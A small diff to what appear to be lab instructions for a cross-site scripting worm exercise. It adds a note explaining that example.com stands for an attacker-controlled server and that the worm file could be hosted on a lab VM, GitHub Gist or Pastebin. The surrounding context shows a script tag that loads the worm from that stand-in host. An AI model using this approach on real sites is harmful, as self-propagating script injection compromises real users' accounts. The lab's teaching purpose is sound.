@@ -362,6 +362,12 @@ The worm can simply copy the following `<script>` tag to the victim's profile, e
 <script type="text/javascript" src="http://example.com/xss_worm.js"></script>
 ```
 
+> **NOTE:** Here `http://example.com/` is an example of a server that you as the attacker control.
+> If you want to use this approach, you need somewhere to store your `xss_worm.js` file.
+> This could be on a server running on your VM (`http://10.9.0.1/`),
+> or a service that allows you to easily store/share code online (e.g., [GitHub Gist](https://gist.github.com/) or [Pastebin](https://pastebin.com/)),
+> or something else!
+
 #### DOM Approach
 
 Assuming the entire JavaScript code (i.e., the worm) is embedded in the infected profile,
